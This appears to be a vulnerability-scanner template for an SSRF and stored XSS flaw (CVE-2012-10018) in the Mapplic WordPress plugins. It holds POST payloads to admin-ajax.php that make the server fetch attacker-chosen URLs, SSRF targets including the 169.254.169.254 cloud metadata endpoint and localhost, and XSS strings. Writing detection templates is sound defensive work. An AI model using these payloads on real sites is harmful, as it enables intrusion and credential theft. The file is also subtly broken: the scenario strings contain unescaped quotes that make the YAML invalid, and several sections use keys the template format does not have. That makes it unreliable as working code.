id: CVE-2012-10018

info:
  name: Mapplic & Mapplic Lite - SSRF & Stored XSS
  author: security研究员
  severity: high
  description: |
    Mapplic and Mapplic Lite WordPress plugins versions up to 6.1 and 1.0 contain a server-side request forgery caused by insufficient validation, letting attackers forge requests from the server and perform an XSS attack if requesting an SVG file.
  reference:
    - https://packetstormsecurity.com/files/161919/
    - https://packetstormsecurity.com/files/161920/
    - https://nvd.nist.gov/vuln/detail/CVE-2012-10018
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:L/A:N
    cvss-score: 9.3
    cve-id: CVE-2012-10018
  metadata:
    verified: true
    max-request: 2
  tags: cve,cve-2012-10018,wordpress,wp-plugin,mapplic,ssrf,xss

http:
  - method: POST
    path:
      - "{{BaseURL}}/wp-admin/admin-ajax.php"

    body: |
      action=mapplic_load&data=[{"id":"1","map":"http://{{interactsh_url}}/malicious.svg","x":"0","y":"0"}]

    matchers-condition: and
    matchers:
      - type: word
        part: interactsh_protocol
        words:
          - "http"

      - type: regex
        part: interactsh_request
        regex:
          - "^(http|https)://"

    extractors:
      - type: json
        part: interactsh
        json:
          - ".protocol"
          - ".full_id"

  - method: POST
    path:
      - "{{BaseURL}}/wp-admin/admin-ajax.php"

    body: |
      action=mapplic_load&data=[{"id":"1","map":"http://{{interactsh_url}}/malicious.svg","x":"0","y":"0"}]

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
          - 201

      - type: word
        words:
          - "success"
          - "mapplic"
        condition: or

    extractors:
      - type: regex
        part: body
        regex:
          - 'mapplic_(.*)'
        group: 1

# Enhanced detection with additional payload variations
payloads:
  - |
    action=mapplic_load&data=[{"id":"test","map":"http://{{interactsh_url}}/test.svg","x":"10","y":"20"}]
  - |
    action=mapplic_load&data=[{"id":"xss","map":"http://{{interactsh_url}}/xss.svg","x":"0","y":"0"}]

# Debug information for validation
debug:
  enable: true
  request: true
  response: true
  error: true

# Additional matchers for stored XSS detection
xss-matchers:
  - type: word
    part: body
    words:
      - "<script>alert('XSS')</script>"
      - "javascript:alert"
      - "onerror=alert"
      - "onload=alert"

# Vulnerability indicators
indicators:
  - "mapplic_"
  - "map_loaded"
  - "success"
  - "error"

# Severity and impact assessment
risk:
  impact: "SSRF can lead to internal network reconnaissance and data exfiltration. Stored XSS can compromise user sessions and site integrity."
  mitigation: "Update to latest version, implement input validation, and sanitize all user input."

# Validation criteria
validation:
  require_interactsh: true
  require_version_check: false
  requires_authenticated: false

# Attack scenarios
scenarios:
  - name: "Basic SSRF"
    description: "Test server-side request forgery to internal networks"
    payload: "action=mapplic_load&data=[{"id":"1","map":"http://{{interactsh_url}}/malicious.svg","x":"0","y":"0"}]"

  - name: "XSS via SVG"
    description: "Trigger stored XSS through SVG file request"
    payload: "action=mapplic_load&data=[{"id":"2","map":"http://{{interactsh_url}}/xss.svg","x":"5","y":"5"}]"

# Response patterns for detection
response_patterns:
  success: 
    - '"success":true'
    - '"map_loaded"'
    - '"data":'

  error:
    - '"error"'
    - '"failed"'
    - '"invalid"'

# Rate limiting consideration
rate_limit: 1

# Additional validation with header injection
headers:
  User-Agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
  Content-Type: "application/x-www-form-urlencoded"
  X-Forwarded-For: "{{interactsh_url}}"

# Payload variations for comprehensive testing
payload_variations:
  - name: "Internal IP"
    pattern: "http://127.0.0.1:80/wp-content/uploads/malicious.svg"

  - name: "Metadata endpoint"
    pattern: "http://169.254.169.254/latest/meta-data/"

  - name: "Localhost bypass"
    pattern: "http://localhost:8080/test.svg"

# Post-exploitation verification
post_exploit:
  check_interactsh: true
  check_stored: true
  verify_xss: false
